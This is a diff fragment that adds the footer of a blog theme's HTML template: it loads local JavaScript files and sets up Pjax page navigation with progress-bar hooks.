+<script src="/js/code-block.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+        
+<script src="/js/post-helper.js"></script>
+
+        
+            
+<script src="/js/libs/anime.min.js"></script>
+
+        
+        
+            
+<script src="/js/toc.js"></script>
+
+        
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
